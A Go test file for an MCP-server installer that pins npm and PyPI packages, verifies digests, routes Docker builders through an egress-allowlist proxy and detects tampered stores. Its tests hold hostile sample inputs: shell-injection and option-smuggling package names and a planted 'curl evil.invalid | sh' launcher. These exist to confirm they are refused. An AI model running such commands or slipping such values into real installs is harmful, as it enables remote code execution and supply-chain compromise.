package mcpinstall

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/blaktron/agentry/pkg/manifest"

	"github.com/blaktron/agentry-cli/pkg/runner/dockerx"
	"github.com/blaktron/agentry-cli/pkg/runner/owner"
	"github.com/blaktron/agentry-cli/pkg/runner/policy"
	"github.com/blaktron/agentry-cli/pkg/runner/receipt"
	"github.com/blaktron/agentry-cli/pkg/runner/spec"
)

// fakeRegistries serves just enough npm + PyPI metadata for resolution.
func fakeRegistries(t *testing.T) policy.MCPRegistries {
	t.Helper()
	mux := http.NewServeMux()
	mux.HandleFunc("GET /@scope%2Fserver-x/1.2.3", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"name":"@scope/server-x","bin":{"server-x":"dist/cli.js"},"engines":{"node":">=20"},"dist":{"tarball":"t","integrity":"sha512-AAA"}}`))
	})
	mux.HandleFunc("GET /no-bin/1.0.0", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"name":"no-bin","dist":{"tarball":"t","integrity":"sha512-BBB"}}`))
	})
	mux.HandleFunc("GET /pypi/mcp-server-fetch/0.6.2/json", func(w http.ResponseWriter, _ *http.Request) {
		// A platform wheel listed first, then the pure-Python one, then the
		// sdist: the pin must prefer none-any and record all three.
		_, _ = w.Write([]byte(`{"info":{"requires_python":">=3.10"},"urls":[
		  {"packagetype":"bdist_wheel","filename":"mcp_server_fetch-0.6.2-cp312-manylinux_x86_64.whl","digests":{"sha256":"beef"}},
		  {"packagetype":"bdist_wheel","filename":"mcp_server_fetch-0.6.2-py3-none-any.whl","digests":{"sha256":"cafe"}},
		  {"packagetype":"sdist","filename":"mcp_server_fetch-0.6.2.tar.gz","digests":{"sha256":"f00d"}}]}`))
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return policy.MCPRegistries{NPM: srv.URL, PyPI: srv.URL}
}

// httpsRegs is regs with https URLs: the install proxy tunnels https
// only, so EnsureInstalled refuses anything else, while the resolution
// tests' fake registry is a plain httptest server that EnsureInstalled
// never contacts.
func httpsRegs(regs policy.MCPRegistries) policy.MCPRegistries {
	regs.NPM = strings.Replace(regs.NPM, "http://", "https://", 1)
	regs.PyPI = strings.Replace(regs.PyPI, "http://", "https://", 1)
	return regs
}

// withRunner marks the runner image built, as the install step leaves it
// before any server is installed: the install proxy runs from it. A builder
// the test does not script ends as a real one does, with an archive of its
// tree on stdout (an empty one).
func withRunner(f *dockerx.Fake) *dockerx.Fake {
	if f.ExistingImages == nil {
		f.ExistingImages = map[string]bool{}
	}
	f.ExistingImages[proxyImage(policy.Images{})] = true
	for name := range f.Foreground {
		if strings.Contains(name, "agentry-mcpinstall-") {
			return f
		}
	}
	if f.Foreground == nil {
		f.Foreground = map[string]*dockerx.FakeForeground{}
	}
	f.Foreground["agentry-mcpinstall-"] = &dockerx.FakeForeground{Stdout: string(make([]byte, 1024))}
	return f
}

func foregroundCalls(f *dockerx.Fake) int {
	n := 0
	for _, c := range f.Calls {
		if c.Op == "RunForeground" {
			n++
		}
	}
	return n
}

func decl(npm, pypi, version string) manifest.MCPServer {
	return manifest.MCPServer{NPM: npm, PyPI: pypi, Version: version}
}

func TestResolveAll(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{
		decl("@scope/server-x", "", "1.2.3"),
		decl("", "mcp-server-fetch", "0.6.2"),
	})
	if err != nil {
		t.Fatal(err)
	}
	if res[0].BinName != "server-x" || res[0].Integrity != "sha512-AAA" {
		t.Fatalf("npm resolution = %+v", res[0])
	}
	// The release's own runtime range is recorded.
	if res[0].DeclaredRuntime != ">=20" || res[1].DeclaredRuntime != ">=3.10" {
		t.Fatalf("declared runtimes = %q, %q", res[0].DeclaredRuntime, res[1].DeclaredRuntime)
	}
	if res[0].ID != "npm-scope-server-x" {
		t.Fatalf("npm id = %q", res[0].ID)
	}
	if got := res[0].Command(); got[0] != "/opt/agentry-mcp/npm-scope-server-x/node_modules/.bin/server-x" {
		t.Fatalf("npm command = %v", got)
	}
	if res[1].Integrity != "sha256:cafe" || res[1].BinName != "mcp-server-fetch" {
		t.Fatalf("pypi resolution = %+v", res[1])
	}
	if len(res[1].Artifacts) != 3 || res[1].Artifacts["mcp_server_fetch-0.6.2-cp312-manylinux_x86_64.whl"] != "beef" {
		t.Fatalf("pypi artifacts = %v, want all three advertised files", res[1].Artifacts)
	}
	if got := res[1].Command(); !strings.HasSuffix(got[0], "/venv/bin/mcp-server-fetch") {
		t.Fatalf("pypi command = %v", got)
	}
}

func TestResolveRefusesBinlessPackage(t *testing.T) {
	regs := fakeRegistries(t)
	_, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("no-bin", "", "1.0.0")})
	if err == nil || !strings.Contains(err.Error(), "no bin") {
		t.Fatalf("binless package not refused: %v", err)
	}
}

func TestEnsureInstalledRunsBuilderOnceAndReuses(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err != nil {
		t.Fatal(err)
	}
	store := t.TempDir()
	fake := &dockerx.Fake{}
	withRunner(fake)
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}

	if err := EnsureInstalled(t.Context(), fake, res, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if n := foregroundCalls(fake); n != 1 {
		t.Fatalf("builder ran %d times, want 1", n)
	}
	// The installer's name is fixed per server: it must remove itself, or
	// the next agent declaring the same server cannot install it.
	if run, ok := fake.FindRun("agentry-mcpinstall-"); !ok || !run.AutoRemove {
		t.Fatalf("installer container not auto-removed: %+v", run)
	}
	// A CLI killed mid-install leaves the builder running; its owner labels
	// are what the next run's sweep removes it by.
	if run, _ := fake.FindRun("agentry-mcpinstall-"); run.Labels["agentry.mcpinstall"] == "" {
		t.Fatalf("installer labels = %v, want the server it builds", run.Labels)
	} else if own := owner.Labels(); own != nil && run.Labels[owner.LabelPID] != own[owner.LabelPID] {
		t.Fatalf("installer labels = %v, want this process as owner", run.Labels)
	}
	// No folder of this machine is mounted into the builder: it installs
	// inside its own filesystem and hands the tree over as an archive on
	// stdout, which this process writes, so the files are the person's. It
	// runs as the image's own user, with npm's home and cache at /tmp.
	// Its stdout, the archive, is kept in no log.
	if run, _ := fake.FindRun("agentry-mcpinstall-"); len(run.Mounts) != 0 || run.User != "" || !run.NoLog {
		t.Fatalf("installer mounts %v as %q (no log %v), want no mount as the image's user, unlogged", run.Mounts, run.User, run.NoLog)
	} else if len(run.Argv) < 3 || run.Argv[0] != "env" || run.Argv[1] != "HOME=/tmp" || run.Argv[2] != "npm_config_cache=/tmp/npm-cache" {
		t.Fatalf("npm not given a writable HOME and cache: %v", run.Argv)
	}
	if _, err := os.Stat(filepath.Join(store, "npm-scope-server-x.json")); err != nil {
		t.Fatalf("resolution not recorded: %v", err)
	}

	// Second install of the SAME resolution: pure reuse, no docker.
	res2, _ := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err := EnsureInstalled(t.Context(), fake, res2, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if n := foregroundCalls(fake); n != 1 {
		t.Fatalf("reuse still ran the builder (count %d)", n)
	}
}

func TestEnsureInstalledRefusesDrift(t *testing.T) {
	store := t.TempDir()
	fake := &dockerx.Fake{}
	withRunner(fake)
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := policy.MCPRegistries{NPM: "https://unused.invalid", PyPI: "https://unused.invalid"}

	first := []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-OLD"}}
	if err := EnsureInstalled(t.Context(), fake, first, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	drifted := []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-NEW"}}
	err := EnsureInstalled(t.Context(), fake, drifted, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "trust decision") {
		t.Fatalf("integrity drift not refused: %v", err)
	}
}

func TestSpecsCarryManifestFilters(t *testing.T) {
	servers := []manifest.MCPServer{{
		NPM: "@scope/server-x", Version: "1.2.3",
		Tools: []string{"list_issues"}, Secrets: []string{"GITHUB_PAT"}, Egress: []string{"api.github.com"},
	}}
	res := []Resolved{{Source: "npm", Package: "@scope/server-x", Version: "1.2.3", ID: "npm-scope-server-x", BinName: "server-x"}}
	specs := Specs(res, servers, policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"})
	s := specs[0]
	if s.Name != "mcp-npm-scope-server-x" || s.Image != "node:test" {
		t.Fatalf("spec = %+v", s)
	}
	if len(s.Tools) != 1 || len(s.Secrets) != 1 || s.Egress[0] != "api.github.com" {
		t.Fatalf("filters not carried: %+v", s)
	}
}

// PyPI installs are wheel-only and verify the pinned artifact against the
// registry's advertised digests before installing; policy
// can opt back into source distributions.
func TestEnsureInstalledPyPIVerifiesWheels(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("", "mcp-server-fetch", "0.6.2")})
	if err != nil {
		t.Fatal(err)
	}
	store := t.TempDir()
	builder := &dockerx.FakeForeground{Print: func(dockerx.RunSpec) string {
		return storeArchive(t, archiveFile{"artifacts.sha256", "kept by the builder", 0o644})
	}}
	fake := &dockerx.Fake{Foreground: map[string]*dockerx.FakeForeground{"agentry-mcpinstall-pypi-": builder}}
	withRunner(fake)
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	if err := EnsureInstalled(t.Context(), fake, res, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	run, ok := fake.FindRun("agentry-mcpinstall-pypi-")
	if !ok {
		t.Fatal("no PyPI builder ran")
	}
	// The program is fixed; the values follow it one per element.
	want := []string{"python", "-c", pypiBuilder, "/opt/agentry-mcp/pypi-mcp-server-fetch", "mcp-server-fetch", "0.6.2", httpsRegs(regs).PyPI + "/simple", "--only-binary=:all:"}
	if !slices.Equal(run.Argv, want) {
		t.Errorf("builder argv = %q\nwant %q", run.Argv[3:], want[3:])
	}
	// The advertised files and digests reach the builder on stdin, which
	// keeps them in the tree it hands back.
	sums := builder.GotStdin
	if !run.Interactive {
		t.Fatal("the PyPI builder's stdin is not attached")
	}
	if kept, err := os.ReadFile(filepath.Join(store, res[0].ID, "artifacts.sha256")); err != nil || string(kept) != "kept by the builder" {
		t.Fatalf("the store is not the builder's tree: %q (%v)", kept, err)
	}
	if !strings.Contains(string(sums), "cafe  mcp_server_fetch-0.6.2-py3-none-any.whl") ||
		!strings.Contains(string(sums), "beef  mcp_server_fetch-0.6.2-cp312-manylinux_x86_64.whl") {
		t.Fatalf("artifact digests file = %q", sums)
	}

	// Policy opt-in: source distributions allowed → no --only-binary.
	regs.PyPIAllowSourceDists = true
	if a := pipArgv(&res[0], regs); a[len(a)-1] != "" {
		t.Fatalf("pypiAllowSourceDists still wheel-only: %q", a[3:])
	}
}

// A PyPI server's launchable entry is the console script the installed
// distribution declares, not the project name: the builder records entry
// points, the host adopts the right one, and a later reuse of the store carries
// the recorded name.
func TestEnsureInstalledPyPIAdoptsDeclaredConsoleScript(t *testing.T) {
	store := t.TempDir()
	fake := &dockerx.Fake{
		ExistingImages: map[string]bool{"python:test": true, proxyImage(policy.Images{}): true},
		Foreground: map[string]*dockerx.FakeForeground{
			"agentry-mcpinstall-pypi-some-tool": {Print: func(dockerx.RunSpec) string {
				return storeArchive(t, archiveFile{consoleScriptsFile, "some-tool-cli\nsome_tool\n", 0o644})
			}},
		},
	}
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := policy.MCPRegistries{NPM: "https://unused.invalid", PyPI: "https://unused.invalid"}
	res := []Resolved{{Source: "pypi", Package: "Some.Tool", Version: "1.0.0", ID: "pypi-some-tool", BinName: "some-tool", Integrity: "sha256:aa"}}
	if err := EnsureInstalled(t.Context(), fake, res, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if res[0].BinName != "some_tool" {
		t.Fatalf("BinName = %q, want the declared script matching the project name", res[0].BinName)
	}
	if got := res[0].Command()[0]; !strings.HasSuffix(got, "/venv/bin/some_tool") {
		t.Fatalf("command = %q", got)
	}
	// Reuse: the fresh resolution only knows the guess; the store knows better.
	again := []Resolved{{Source: "pypi", Package: "Some.Tool", Version: "1.0.0", ID: "pypi-some-tool", BinName: "some-tool", Integrity: "sha256:aa"}}
	installOps := len(fake.Ops())
	if err := EnsureInstalled(t.Context(), fake, again, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if again[0].BinName != "some_tool" {
		t.Fatalf("reused BinName = %q", again[0].BinName)
	}
	if n := len(fake.Ops()); n != installOps { // reuse touches docker not at all
		t.Fatalf("docker ops on reuse: %v", fake.Ops()[installOps:])
	}
}

func TestChooseConsoleScript(t *testing.T) {
	cases := []struct {
		pkg   string
		names []string
		want  string
		ok    bool
	}{
		{"mcp-server-fetch", []string{"mcp-server-fetch"}, "mcp-server-fetch", true},
		{"mcp_server_fetch", []string{"other", "mcp-server-fetch"}, "mcp-server-fetch", true},
		{"Some.Tool", []string{"sometool-cli"}, "sometool-cli", true},
		{"pkg", []string{"zeta", "alpha", ""}, "alpha", true},
		{"pkg", []string{"", "  "}, "", false},
		{"pkg", nil, "", false},
	}
	for _, c := range cases {
		got, ok := chooseConsoleScript(c.pkg, c.names)
		if got != c.want || ok != c.ok {
			t.Errorf("chooseConsoleScript(%q, %v) = %q,%v want %q,%v", c.pkg, c.names, got, ok, c.want, c.ok)
		}
	}
	if NormalizePyPIName("Mcp__Server.Fetch-") != "mcp-server-fetch" {
		t.Fatal(NormalizePyPIName("Mcp__Server.Fetch-"))
	}
}

// The builder program names the files the Go side writes and reads, and
// records the dist's console scripts only after installing it.
func TestPypiBuilderProgram(t *testing.T) {
	for _, want := range []string{`ARTIFACT_SUMS = "` + artifactSumsFile + `"`, `CONSOLE_SCRIPTS_FILE = "` + consoleScriptsFile + `"`, "console_scripts"} {
		if !strings.Contains(pypiBuilder, want) {
			t.Errorf("pypi_builder.py lacks %q", want)
		}
	}
	if strings.Index(pypiBuilder, `run([pip, "install"`) > strings.LastIndex(pypiBuilder, "CONSOLE_SCRIPTS,") {
		t.Fatal("console scripts must be read after pip install")
	}
	// The venv's pip trusts the image's CA bundle, not the one it vendors,
	// from its first fetch on.
	swap := strings.Index(pypiBuilder, `shutil.copyfile(SYSTEM_CA_BUNDLE, vendored)`)
	if !strings.Contains(pypiBuilder, `SYSTEM_CA_BUNDLE = "/etc/ssl/certs/ca-certificates.crt"`) || swap < 0 ||
		swap < strings.Index(pypiBuilder, `"-m", "venv"`) || swap > strings.Index(pypiBuilder, `run([pip, "download"`) {
		t.Fatal("the venv's vendored CA bundle must be replaced by the system's before pip fetches")
	}
}

// No manifest value reaches a shell: a package name carrying shell syntax is
// one argv element of a fixed program, and the builder refuses it before any
// container runs, as it refuses a value pip or npm would read as an option or
// an npm spec that is not a registry version.
func TestBuilderValuesNeverReachAShell(t *testing.T) {
	evil := Resolved{Source: "pypi", Package: "x; touch /tmp/x", Version: "1.0", ID: "pypi-x"}
	argv := pipArgv(&evil, policy.MCPRegistries{PyPI: "http://pypi.invalid"})
	if argv[0] != "python" || argv[1] != "-c" || argv[2] != pypiBuilder || argv[4] != "x; touch /tmp/x" || len(argv) != 8 {
		t.Fatalf("argv = %q", argv[3:])
	}
	for _, a := range argv {
		if a == "sh" || a == "bash" {
			t.Fatalf("a shell in the builder argv: %q", argv)
		}
	}

	cases := []struct{ src, pkg, version string }{
		{"pypi", "x; touch /tmp/x", "1.0"},
		{"pypi", "--index-url=http://evil.invalid", "1.0"},
		{"pypi", "fine", "1.0 --pre"},
		{"npm", "server-x", "file:../../etc"},
		{"npm", "server-x", "http://evil.invalid/x.tgz"},
		{"npm", "-g", "1.0.0"},
		{"npm", "server-x", ""},
	}
	for _, c := range cases {
		fake := &dockerx.Fake{}
		withRunner(fake)
		r := []Resolved{{Source: c.src, Package: c.pkg, Version: c.version, ID: c.src + "-x", BinName: "x"}}
		err := EnsureInstalled(t.Context(), fake, r, t.TempDir(), policy.MCPRegistries{NPM: "https://n.invalid", PyPI: "https://p.invalid"},
			policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, policy.DockerPolicy{}, io.Discard)
		if err == nil || !strings.Contains(err.Error(), "builder will pass on") || len(fake.Calls) != 0 {
			t.Errorf("%s %q@%q: err=%v docker calls=%v", c.src, c.pkg, c.version, err, fake.Ops())
		}
		d := manifest.MCPServer{Version: c.version}
		if c.src == "npm" {
			d.NPM = c.pkg
		} else {
			d.PyPI = c.pkg
		}
		if _, err := ResolveAll(t.Context(), nil, policy.MCPRegistries{NPM: "https://n.invalid", PyPI: "https://p.invalid"}, []manifest.MCPServer{d}); err == nil || !strings.Contains(err.Error(), "builder will pass on") {
			t.Errorf("resolve %s %q@%q: %v", c.src, c.pkg, c.version, err)
		}
	}
	for _, ok := range [][2]string{{"@scope/server-x", "1.2.3-rc.1+build.5"}, {"mcp_server.fetch", "0.6.2.post1"}} {
		if err := builderArgs(ok[0], ok[1]); err != nil {
			t.Errorf("builderArgs(%q, %q) = %v", ok[0], ok[1], err)
		}
	}
}

// The builder's only route out is the install proxy: an internal network of its
// own, where the runner image's proxy allows the configured registry and the
// artifact hosts the registry's metadata named, and nothing else; the builder
// is told the proxy by the proxy variables. The proxy's decisions are kept
// beside the record, the record names the allowlist, and the proxy and the
// network go when the build ends.
func TestEnsureInstalledRoutesTheBuilderThroughTheInstallProxy(t *testing.T) {
	cases := []struct {
		decl      manifest.MCPServer
		regs      policy.MCPRegistries
		resolved  Resolved
		wantAllow []string
	}{
		{
			decl:      decl("@scope/server-x", "", "1.2.3"),
			regs:      policy.MCPRegistries{NPM: "https://registry.npmjs.org", PyPI: "https://pypi.org"},
			resolved:  Resolved{Source: "npm", Package: "@scope/server-x", Version: "1.2.3", ID: "npm-scope-server-x", BinName: "server-x", Integrity: "sha512-A"},
			wantAllow: []string{"registry.npmjs.org:443"},
		},
		{
			decl: decl("", "mcp-server-fetch", "0.6.2"),
			regs: policy.MCPRegistries{NPM: "https://registry.npmjs.org", PyPI: "https://pypi.org"},
			resolved: Resolved{Source: "pypi", Package: "mcp-server-fetch", Version: "0.6.2", ID: "pypi-mcp-server-fetch", BinName: "mcp-server-fetch", Integrity: "sha256:aa",
				FetchHosts: []string{"files.pythonhosted.org:443"}},
			wantAllow: []string{"files.pythonhosted.org:443", "pypi.org:443"},
		},
	}
	for _, c := range cases {
		t.Run(c.decl.SourceID(), func(t *testing.T) {
			store := t.TempDir()
			id := c.resolved.ID
			fake := withRunner(&dockerx.Fake{LogsByName: map[string]string{installProxyName(id): "allow pypi.org:443\ndeny evil.example:443\n"}})
			res := []Resolved{c.resolved}
			if err := EnsureInstalled(t.Context(), fake, res, store, c.regs, policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, policy.DockerPolicy{Runtime: "runsc"}, io.Discard); err != nil {
				t.Fatal(err)
			}
			ops := fake.Ops()
			net := installNetworkName(id)
			for _, want := range []string{
				"NetworkCreate:" + net + "(internal=true)",
				"RunDetached:" + installProxyName(id),
				"NetworkConnect:bridge<-" + installProxyName(id),
				"RemoveForce:" + installProxyName(id),
				"NetworkRemove:" + net,
			} {
				if !slices.Contains(ops, want) {
					t.Errorf("docker ops lack %q: %v", want, ops)
				}
			}
			proxy, ok := fake.FindRun(installProxyName(id))
			if !ok {
				t.Fatal("no install proxy ran")
			}
			wantArgv := []string{"proxy", "--allow", strings.Join(c.wantAllow, ","), "--addr", ":3128"}
			if proxy.Image != proxyImage(policy.Images{}) || !slices.Equal(proxy.Argv, wantArgv) || proxy.Network != net || proxy.Alias != installProxyAlias {
				t.Errorf("install proxy = image %q argv %q network %q alias %q; want %q %q", proxy.Image, proxy.Argv, proxy.Network, proxy.Alias, proxyImage(policy.Images{}), wantArgv)
			}
			// The runner's own binary on the daemon's default: it resolves
			// the registry through docker's DNS.
			if proxy.Runtime != "" || !proxy.ReadOnly || !proxy.NoNewPrivileges {
				t.Errorf("install proxy posture: runtime %q readOnly %v noNewPrivileges %v", proxy.Runtime, proxy.ReadOnly, proxy.NoNewPrivileges)
			}
			builder, ok := fake.FindRun("agentry-mcpinstall-" + id)
			if !ok {
				t.Fatal("no builder ran")
			}
			if builder.Network != net {
				t.Errorf("builder network = %q, want the install network %q (never the bridge)", builder.Network, net)
			}
			if got := builder.Env["HTTPS_PROXY"]; got != "http://mcp-install-proxy:3128" || builder.Env["https_proxy"] != got || builder.Env["npm_config_https_proxy"] != got || builder.Env["PIP_PROXY"] != got {
				t.Errorf("builder proxy env = %v", builder.Env)
			}
			logb, err := os.ReadFile(filepath.Join(store, id+installProxyLogSuffix))
			if err != nil || !strings.Contains(string(logb), "deny evil.example:443") {
				t.Errorf("install proxy log = %q, %v", logb, err)
			}
			meta, err := LoadMeta(store, id)
			if err != nil || meta == nil || !slices.Equal(meta.InstallEgress, c.wantAllow) {
				t.Errorf("recorded install egress = %+v, %v; want %q", meta, err, c.wantAllow)
			}
		})
	}
}

// The proxy tunnels https only, so a plain-http registry is refused before
// anything starts, and so is a missing runner image, which docker would
// otherwise try to pull under a name that is only ever built locally.
func TestEnsureInstalledRefusesWhatTheInstallProxyCannotCarry(t *testing.T) {
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	res := func() []Resolved {
		return []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-A"}}
	}
	fake := withRunner(&dockerx.Fake{})
	err := EnsureInstalled(t.Context(), fake, res(), t.TempDir(), policy.MCPRegistries{NPM: "http://registry.example", PyPI: "https://pypi.org"}, images, policy.DockerPolicy{}, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "https") {
		t.Errorf("an http registry: %v", err)
	}
	if foregroundCalls(fake) != 0 || len(fake.Ops()) != 0 {
		t.Errorf("an http registry still touched docker: %v", fake.Ops())
	}
	bare := &dockerx.Fake{ExistingImages: map[string]bool{"node:test": true}}
	err = EnsureInstalled(t.Context(), bare, res(), t.TempDir(), policy.MCPRegistries{NPM: "https://registry.npmjs.org", PyPI: "https://pypi.org"}, images, policy.DockerPolicy{}, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "not built") {
		t.Errorf("no runner image: %v", err)
	}
	if foregroundCalls(bare) != 0 {
		t.Error("the builder ran without its proxy")
	}
}

// Resolution records where the pinned artifact is fetched from, when that
// is not the registry itself: npm's tarball host, PyPI's file host. Only
// https URLs count; the registry's own host is not repeated.
func TestFetchHosts(t *testing.T) {
	got := fetchHosts("https://pypi.org",
		"https://files.pythonhosted.org/packages/a.whl", "https://files.pythonhosted.org/packages/b.tar.gz",
		"https://pypi.org/x", "http://plain.example/y", "t", "https://mirror.example:8443/z")
	want := []string{"files.pythonhosted.org:443", "mirror.example:8443"}
	if !slices.Equal(got, want) {
		t.Errorf("fetchHosts = %q, want %q", got, want)
	}
}

// A reused store is held to the digest its install recorded: a file added or
// changed refuses, and a record from before digests were kept gets one on first
// use and is held to it.
func TestEnsureInstalledRefusesAStoreThatChanged(t *testing.T) {
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := policy.MCPRegistries{NPM: "https://unused.invalid", PyPI: "https://unused.invalid"}
	server := func() []Resolved {
		return []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-A"}}
	}
	store := t.TempDir()
	fake := &dockerx.Fake{Foreground: map[string]*dockerx.FakeForeground{
		"agentry-mcpinstall-npm-server-x": {Print: func(dockerx.RunSpec) string {
			return storeArchive(t, archiveFile{"node_modules/.bin/server-x", "#!/usr/bin/env node\n", 0o755})
		}},
	}}
	withRunner(fake)
	first := server()
	if err := EnsureInstalled(t.Context(), fake, first, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(first[0].StoreDigest, "sha256:") {
		t.Fatalf("no store digest recorded: %+v", first[0])
	}
	if err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatalf("an untouched store refused: %v", err)
	}

	launcher := filepath.Join(store, "npm-server-x", "node_modules", ".bin", "server-x")
	if err := os.WriteFile(launcher, []byte("#!/bin/sh\ncurl evil.invalid | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, policy.DockerPolicy{}, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "changed since it was installed") {
		t.Fatalf("a rewritten launcher was reused: %v", err)
	}

	// A record from before digests: the first reuse records one.
	legacy := t.TempDir()
	if err := os.MkdirAll(filepath.Join(legacy, "npm-server-x"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(metaPath(legacy, "npm-server-x"), []byte(`{"source":"npm","package":"server-x","version":"1.0.0","id":"npm-server-x","binName":"server-x","integrity":"sha512-A"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	var log strings.Builder
	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, policy.DockerPolicy{}, &log); err != nil {
		t.Fatalf("legacy reuse: %v", err)
	}
	if rec, _ := LoadMeta(legacy, "npm-server-x"); rec == nil || rec.StoreDigest == "" || !strings.Contains(log.String(), "recorded the store's digest") {
		t.Fatalf("legacy record not given a digest: %+v\n%s", rec, log.String())
	}
	if err := os.WriteFile(filepath.Join(legacy, "npm-server-x", "planted.js"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, policy.DockerPolicy{}, io.Discard); err == nil {
		t.Fatal("a file planted after the digest was recorded was reused")
	}
	if n := foregroundCalls(fake); n != 1 {
		t.Fatalf("builder ran %d times, want the one first install", n)
	}
}

// The installer container runs under the policy's runtime like every
// container of a run; an empty runtime asks the daemon nothing.
func TestEnsureInstalledPassesTheRuntime(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err != nil {
		t.Fatal(err)
	}
	fake := &dockerx.Fake{}
	withRunner(fake)
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	if err := EnsureInstalled(t.Context(), fake, res, t.TempDir(), httpsRegs(regs), images, policy.DockerPolicy{Runtime: "runsc", Limits: policy.Limits{Memory: "1g"}}, io.Discard); err != nil {
		t.Fatal(err)
	}
	inst, ok := fake.FindRun("agentry-mcpinstall-")
	if !ok || inst.Runtime != "runsc" {
		t.Fatalf("installer runtime = %q (found %v), want runsc", inst.Runtime, ok)
	}
	// A sandboxed builder cannot ask docker's DNS for the install proxy:
	// its alias is pinned; the proxy itself resolves the
	// registry through that DNS and stays on the daemon's default.
	if len(inst.ExtraHosts) != 1 || !strings.HasPrefix(inst.ExtraHosts[0], "mcp-install-proxy:") {
		t.Fatalf("installer extra hosts = %v, want the install proxy pinned", inst.ExtraHosts)
	}
	if proxy, ok := fake.FindRun("agentry-mcpproxy-"); !ok || proxy.Runtime != "" {
		t.Fatalf("install proxy runtime = %q (found %v), want the daemon's default", proxy.Runtime, ok)
	}
	// The run's container posture too, the policy's memory and the defaults for
	// what it left unset.
	if len(inst.CapDrop) != 1 || inst.CapDrop[0] != "ALL" || !inst.NoNewPrivileges || inst.Memory != "1g" ||
		inst.CPUs != policy.DefaultCPUs || inst.PidsLimit != policy.DefaultPids {
		t.Fatalf("installer posture: cap-drop %v nnp %v memory %q cpus %d pids %d", inst.CapDrop, inst.NoNewPrivileges, inst.Memory, inst.CPUs, inst.PidsLimit)
	}
	// With the host's name servers the proxy runs under the runtime too:
	// on an egress network of the install's own, joined
	// at create, reading a resolv.conf of its own; nothing is connected
	// after it starts, and both networks and the file go with the install.
	// The file is bound from under the server store, a path the docker
	// daemon finds as the CLI does: a sandbox host's runhost runs the CLI
	// in a container sharing only its runner home with the host, and a
	// file in the process's temporary directory was missing on the
	// daemon's side. One a killed install left behind is
	// swept when the next starts.
	fake3 := &dockerx.Fake{}
	withRunner(fake3)
	store3 := t.TempDir()
	stale := filepath.Join(store3, "."+res[0].ID+".dns-killed")
	if err := os.MkdirAll(stale, 0o755); err != nil {
		t.Fatal(err)
	}
	var conf string
	var relabel bool
	fake3.OnDetached = func(r dockerx.RunSpec) {
		for _, m := range r.Mounts {
			if m.Target == "/etc/resolv.conf" && m.ReadOnly {
				b, _ := os.ReadFile(m.Source)
				conf, relabel = m.Source+"\n"+string(b), m.Relabel
			}
		}
	}
	if err := EnsureInstalled(t.Context(), fake3, res, store3, httpsRegs(regs), images, policy.DockerPolicy{Runtime: "runsc", Resolvers: []string{"192.0.2.53"}}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if path, _, _ := strings.Cut(conf, "\n"); !strings.HasPrefix(path, store3+string(filepath.Separator)) || !relabel {
